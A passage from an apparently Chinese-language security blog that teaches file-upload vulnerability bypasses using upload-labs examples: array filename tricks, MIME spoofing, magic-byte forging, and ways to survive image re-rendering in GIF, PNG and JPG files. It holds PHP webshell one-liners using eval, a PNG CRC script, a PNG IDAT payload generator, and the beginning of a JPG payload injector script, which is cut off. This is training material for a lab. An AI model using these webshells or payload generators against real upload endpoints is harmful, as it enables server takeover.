class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p><p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。并且后缀有白名单过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ext = end($file);</span><br><span class="line">$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br></pre></td></tr></table></figure><p>而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>smi1e.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>smi1e.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>smi1e.php</code>。</p><p><strong>绕过</strong></p><p>burp抓包修改为数组，如下</p><p><img src="image-20210215181210201.png" alt="image-20210215181210201"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p>本文总结了常见的文件上传漏洞的校验和绕过方法</p><span id="more"></span><p>先放几张偷的图，但是很实用。。。</p><p><img src="image-20210210161637992.png" alt="image-20210210161637992"></p><p><img src="image-20210210161842598.png" alt="image-20210210161842598"></p><p>一般HTTP-Header有以下组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 274</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure><p>请求Header中Content-Type存在以下特征：</p><ul><li>multipart&#x2F;form-data（表示该请求是一个文件上传请求）</li><li>存在boundary字符串（作用为分隔符，以区分POST数据）</li></ul><p>POST的内容存在以下特征：</p><ul><li>Content-Disposition</li><li>name</li><li>filename</li><li>POST中的boundary的值就是Content-Type的值在最前面加了两个–，除了最后标识结束的boundary</li></ul><h2 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1.客户端校验"></a>1.客户端校验</h2><p><strong>校验原理</strong></p><p>一般是在客户端用js脚本校验上传文件的后缀名。</p><p><strong>绕过</strong></p><p>1、浏览器关闭js</p><p>2、burp抓包改后缀</p><h2 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2.服务端校验"></a>2.服务端校验</h2><h3 id="1-HTTP-Header校验"><a href="#1-HTTP-Header校验" class="headerlink" title="1.HTTP-Header校验"></a>1.HTTP-Header校验</h3><h4 id="1-content-type校验"><a href="#1-content-type校验" class="headerlink" title="1.content-type校验"></a>1.content-type校验</h4><p><strong>原理</strong></p><p>模拟web服务器端的校验代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p><p><strong>绕过</strong></p><p>burp抓包，修改与上传点要求的文件类型的MIME即可。</p><p>一般来说，有以下MIME类型：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a></p><h4 id="2-大写-Multipart"><a href="#2-大写-Multipart" class="headerlink" title="2.大写 Multipart"></a>2.大写 Multipart</h4><p>即将请求头中的 Content-Type 的 multipart&#x2F;form-data 第一个字符 m 改成 M，即 Multipart&#x2F;form-data（不影响传输）</p><h3 id="2-文件头校验"><a href="#2-文件头校验" class="headerlink" title="2.文件头校验"></a>2.文件头校验</h3><p><strong>原理</strong></p><p>用到了getimagesize()函数，检测文件内容开始处的文件幻数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.JPEG;.JPE;.JPG： FF D8 FF E0 00 10 4A 46 49 46（JPGGraphic File）</span><br><span class="line">.png：89 50 4E 47（ PNG）</span><br><span class="line">.gif：47 49 46 38 39 61（GIF89a）</span><br><span class="line">.zip：”Zip Compressed”</span><br><span class="line">.doc、.xls、.xlt、.ppt、.apr：”MS Compound Document v1 or Lotus Approach APRfile”</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p> 伪造幻数，在木马内容基础上再加了一些文件信息，例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php eval($_POST[&#x27;test&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>或者是在文件开头处写下以下内容</p><p><img src="image-20210212195306465.png" alt="image-20210212195306465"></p><h3 id="3-文件内容校验"><a href="#3-文件内容校验" class="headerlink" title="3.文件内容校验"></a>3.文件内容校验</h3><h4 id="1-文件内容替换"><a href="#1-文件内容替换" class="headerlink" title="1.文件内容替换"></a>1.文件内容替换</h4><p><strong>原理</strong></p><p>将文件中的敏感字符替换掉，大致代码类似于下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$content = str_replace(&#x27;?&#x27;, &#x27;!&#x27;, $content);</span><br><span class="line">$file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">        file_put_contents($file, $content);</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如果我们要上传php的一句话<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>时，php的语言标记中的<code>?</code>会被替换为<code>!</code>，这样一句话就不能被执行了</p><p><strong>绕过</strong></p><p>主要还是要根据实际过滤的字符来判断，如果写死的话可能是没办法的（一般不会，因为还要兼顾图片上传）</p><p>比如过滤掉问号，我们就可以使用<code>&lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;);&lt;/script&gt;</code>这样的一句话。具体方法要看实际代码过滤了哪些字符。</p><h4 id="2-文件加载检测"><a href="#2-文件加载检测" class="headerlink" title="2.文件加载检测"></a>2.文件加载检测</h4><p>一个灰常经典的例子，<code>upload-labs Pass-16</code>，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">   <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">           <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">           <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">               <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">               @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="comment">//给新图片指定文件名</span></span><br><span class="line">               <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">               <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">               <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">               <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">               <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">               @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">               <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>使用<strong>imagecreatefromjpeg（）</strong>函数调用php中的<strong>GD</strong>库转换了图像。</p><p>使用二次渲染之后，图片中的恶意代码会被去除。</p><p><strong>绕过</strong></p><h5 id="上传GIF"><a href="#上传GIF" class="headerlink" title="上传GIF"></a>上传GIF</h5><p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p><p>例如以下部分没有变化</p><p><img src="image-20210212211325478.png" alt="image-20210212211325478"></p><p>我们就将代码写到该处</p><p><img src="image-20210212211352364.png" alt="image-20210212211352364"></p><h5 id="上传PNG"><a href="#上传PNG" class="headerlink" title="上传PNG"></a>上传PNG</h5><p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,PLTE,IDAT, IEND)，每个PNG文件都必须包含它们.</p><p><strong>数据块结构</strong></p><p><img src="image-20210212212307066.png" alt="image-20210212212307066"></p><p><strong>IHDR</strong></p><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节组成，它的格式如下图所示。</p><p><img src="image-20210212214948106.png" alt="image-20210212214948106"></p><p><strong>PLTE</strong></p><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</p><p><strong>IDAT</strong></p><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p><p><strong>IEND</strong></p><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>写入php代码</p><p><strong>写入PLTE数据块</strong></p><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p><p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p><ol><li><p>在PLTE数据块写入php代码.</p><p><img src="image-20210212215554445.png" alt="image-20210212215554445"></p></li><li><p>计算PLTE数据块的CRC<br>CRC脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = <span class="built_in">open</span>(<span class="string">r&#x27;2.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span></span><br><span class="line">data =  <span class="string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:-<span class="number">16</span>].decode(<span class="string">&#x27;hex&#x27;</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(crc)</span><br></pre></td></tr></table></figure><p>运行结果<code>526579b0</code></p></li><li><p>修改CRC值</p><p><img src="image-20210212215653375.png" alt="image-20210212215653375"></p></li></ol><p><strong>写入IDAT数据块</strong></p><p>这里有国外大牛写的脚本,直接拿来运行即可.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后得到1.png.</p><h5 id="上传JPG"><a href="#上传JPG" class="headerlink" title="上传JPG"></a>上传JPG</h5><p>这里也采用国外大牛编写的脚本jpg_payload.php.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    